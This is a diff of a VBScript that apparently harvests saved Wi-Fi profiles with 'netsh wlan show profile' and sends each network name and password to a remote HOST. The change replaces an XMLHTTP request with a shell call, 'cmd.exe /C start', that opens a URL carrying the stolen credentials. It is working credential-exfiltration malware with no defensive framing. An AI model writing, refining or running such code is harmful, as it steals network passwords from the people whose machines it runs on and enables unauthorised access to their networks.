@@ -19,9 +19,10 @@ Function GetOutput(command)
 End Function
 
 Function sendIt(wifi, passwd)
-  Set request = CreateObject("MSXML2.XMLHTTP")
-  request.Open "GET", HOST & "/?ssid=" & wifi & "&pass=" & passwd, False
-  request.Send
+  Set request = WScript.CreateObject("WScript.SHell")
+  request.run "cmd.exe /C start " &  HOST & "/?ssid=" & wifi & "&pass=" & passwd
+  WScript.Sleep 1000
+
 End Function
 
 strText=Split(GetOutput("netsh wlan show profile"), "\n")
